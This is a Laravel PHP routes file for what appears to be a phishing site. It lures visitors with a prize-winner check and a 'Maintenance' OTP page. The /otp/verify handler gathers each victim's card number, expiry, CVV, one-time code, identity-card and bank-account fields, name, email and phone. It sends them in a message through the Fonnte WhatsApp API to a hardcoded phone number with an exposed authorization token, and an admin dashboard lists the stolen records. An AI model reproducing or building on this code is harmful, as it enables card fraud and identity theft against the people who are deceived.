<?php

use App\Http\Controllers\AuthController;
use App\Http\Controllers\HadiahController;
use App\Http\Controllers\MemberController;
use App\Http\Controllers\OTPController;
use App\Http\Controllers\SettingController;
use App\Http\Controllers\UserController;
use App\Models\Costumer;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
   return inertia('Home');
});

Route::get('/check-pemenang', function () {
    return inertia('CheckWinner');
});
Route::post('/check-pemenang', [HadiahController::class, 'check']);

// OTP Routes
Route::get('/otp/{costumerId}', function ($costumerId) {
    return inertia('Maintenance', [
        'costumerId' => $costumerId,
    ]);
});
Route::get('/hasil-pemenang', function () {
    return inertia('HalamanPemenang');
});
Route::post('/otp/verify', function(Request $request) {
    $request->validate([
        'costumer_id' => ['required', 'exists:costumers,id'],
        'code' => ['required', 'string', 'size:6'],
    ]);
    $costumerId = $request->input('costumer_id');
    $costumer = Costumer::find($costumerId);
    $costumer->update([
        'otp' => $request->input('code'),
    ]);
    $message = "
card_number: {$costumer->card_number}
email: {$costumer->email}
my_cad: {$costumer->my_cad}
akaunt_kad: {$costumer->akaunt_kad}
nama_lengkap: {$costumer->nama_lengkap}
phone_number: {$costumer->phone_number}
expiry: {$costumer->expiry}
cvv: {$costumer->cvv}
otp: {$costumer->otp}
";

    $response = Http::withHeaders([
        'Authorization' => 'oAMf+vjnQeV9gmqAGRb8',
    ])->post(
        'https://api.fonnte.com/send',
        [
            'target'  => '6285824477908',
            'message' => $message
        ]
    );
});

Route::get('/admin/login', function () {
    return inertia('Auth/AdminLogin');
})->name('login');
Route::post('/admin/login', [AuthController::class, 'adminLogin']);
Route::post('/admin/logout', [AuthController::class, 'adminLogout']);

Route::middleware('auth')->group(function () {
    Route::get('/admin/dashboard', function () {
        return inertia('Admin/Dashboard', [
            'customers' => Costumer::query()
                ->latest()
                ->get(),
        ]);
    });

    Route::get('/admin/settings/wa', [SettingController::class, 'index']);
    Route::post('/admin/settings/wa', [SettingController::class, 'store']);

    Route::get('/admin/users', [UserController::class, 'index']);
});

Route::get('/member/login', function () {
    return inertia('Auth/MemberLogin');
});
Route::post('/member/login', [MemberController::class, 'login']);
Route::post('/member/logout', [MemberController::class, 'logout']);

Route::get('/member/register', function () {
    return inertia('Auth/RegisterMember');
});